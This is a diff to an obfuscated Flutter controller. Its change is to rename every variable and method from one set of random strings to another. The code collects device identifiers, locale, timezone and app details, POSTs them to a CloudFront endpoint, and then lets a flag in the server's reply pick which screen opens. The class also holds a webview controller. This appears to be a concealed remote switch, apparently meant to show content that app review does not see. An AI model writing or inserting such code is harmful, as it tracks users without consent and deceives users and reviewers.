@@ -10,12 +10,12 @@ import 'package:flutter_timezone/flutter_timezone.dart';
 
 class BuildLogPlaceLogic extends GetxController {
 
-  var wdvzcst = RxBool(false);
-  var dylwvrgce = RxBool(true);
-  var jlgx = RxString("");
-  var hritasvf = RxBool(false);
-  var ykpc = RxBool(true);
-  final ztodslji = Dio();
+  var jzogcmfse = RxBool(false);
+  var jinevprcf = RxBool(true);
+  var kpmtuls = RxString("");
+  var kdqi = RxBool(false);
+  var teupjdxn = RxBool(true);
+  final fgsejlqy = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,54 +23,49 @@ class BuildLogPlaceLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    sczt();
+    mhduel();
   }
 
 
-  Future<void> sczt() async {
-    hritasvf.value = true;
-    ykpc.value = true;
-    dylwvrgce.value = false;
+  Future<void> mhduel() async {
+    kdqi.value = true;
+    teupjdxn.value = true;
+    jinevprcf.value = false;
 
-    ztodslji.post("https://d3nzspy8zkd8c6.cloudfront.net/lfgvxujatmprkisyhnqwo",data: await rxeqlpwvg()).then((value) {
+    fgsejlqy.post("https://d3nzspy8zkd8c6.cloudfront.net/lfgvxujatmprkisyhnqwo",data: await bgmocd()).then((value) {
       var egkvidqt = value.data["egkvidqt"] as String;
       var owvajlb = value.data["owvajlb"] as bool;
       if (owvajlb) {
-        jlgx.value = egkvidqt;
-        mbwdzx();
+        kpmtuls.value = egkvidqt;
+        kdnwm();
       } else {
-        vjziuba();
+        bplinf();
       }
     }).catchError((e) {
-      dylwvrgce.value = true;
-      ykpc.value = true;
-      hritasvf.value = false;
+      jinevprcf.value = true;
+      teupjdxn.value = true;
+      kdqi.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> rxeqlpwvg() async {
-    final DeviceInfoPlugin aqwlbudj = DeviceInfoPlugin();
-    PackageInfo duxplc_ziyfxmqp = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> bgmocd() async {
+    final DeviceInfoPlugin ymdathj = DeviceInfoPlugin();
+    PackageInfo egiaxd_oevjksy = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var zqhpmb = Platform.localeName;
+    var jusrafp = Platform.localeName;
     var cfotv = currentTimeZone;
 
-    var eqof = duxplc_ziyfxmqp.packageName;
-    var vkixs = duxplc_ziyfxmqp.version;
-    var jhnk = duxplc_ziyfxmqp.buildNumber;
+    var eqof = egiaxd_oevjksy.packageName;
+    var vkixs = egiaxd_oevjksy.version;
+    var jhnk = egiaxd_oevjksy.buildNumber;
 
-    var aoykgln = duxplc_ziyfxmqp.appName;
+    var aoykgln = egiaxd_oevjksy.appName;
     var apjvr = "";
     var wcpf  = "";
     var wzyqbj = "";
-    var vcrpumg = "";
-    var amelncdr = "";
-    var vyenol = "";
-    var jzhfap = "";
-    var vodp = "";
-    var xmfgyk = "";
-    var jvwskyml = "";
-    var mtsdr = "";
+    var fcsbdwme = "";
+    var jslwrfhp = "";
+    var oxnlicd = "";
 
 
     var tokjyr = "";
@@ -78,55 +73,51 @@ class BuildLogPlaceLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       tokjyr = "android";
-      var yapuvn = await aqwlbudj.androidInfo;
+      var nsgteaujz = await ymdathj.androidInfo;
 
-      wzyqbj = yapuvn.brand;
+      wzyqbj = nsgteaujz.brand;
 
-      apjvr  = yapuvn.model;
-      wcpf = yapuvn.id;
+      apjvr  = nsgteaujz.model;
+      wcpf = nsgteaujz.id;
 
-      eahsb = yapuvn.isPhysicalDevice;
+      eahsb = nsgteaujz.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       tokjyr = "ios";
-      var tehanoc = await aqwlbudj.iosInfo;
-      wzyqbj = tehanoc.name;
-      apjvr = tehanoc.model;
+      var gptqzowi = await ymdathj.iosInfo;
+      wzyqbj = gptqzowi.name;
+      apjvr = gptqzowi.model;
 
-      wcpf = tehanoc.identifierForVendor ?? "";
-      eahsb  = tehanoc.isPhysicalDevice;
+      wcpf = gptqzowi.identifierForVendor ?? "";
+      eahsb  = gptqzowi.isPhysicalDevice;
     }
+
     var res = {
       "aoykgln": aoykgln,
-      "vkixs": vkixs,
-      "eahsb": eahsb,
+      "jhnk": jhnk,
+      "fcsbdwme" : fcsbdwme,
+      "eqof": eqof,
       "apjvr": apjvr,
-      "amelncdr" : amelncdr,
+      "eahsb": eahsb,
       "cfotv": cfotv,
       "wzyqbj": wzyqbj,
       "wcpf": wcpf,
-      "jhnk": jhnk,
-      "zqhpmb": zqhpmb,
+      "jusrafp": jusrafp,
       "tokjyr": tokjyr,
-      "vcrpumg" : vcrpumg,
-      "eqof": eqof,
-      "vyenol" : vyenol,
-      "jzhfap" : jzhfap,
-      "vodp" : vodp,
-      "xmfgyk" : xmfgyk,
-      "jvwskyml" : jvwskyml,
-      "mtsdr" : mtsdr,
+      "vkixs": vkixs,
+      "jslwrfhp" : jslwrfhp,
+      "oxnlicd" : oxnlicd,
 
     };
     return res;
   }
 
-  Future<void> vjziuba() async {
+  Future<void> bplinf() async {
     Get.offNamed("/build_tab");
   }
 
-  Future<void> mbwdzx() async {
+  Future<void> kdnwm() async {
     Get.offNamed("/build_home_array");
   }
 
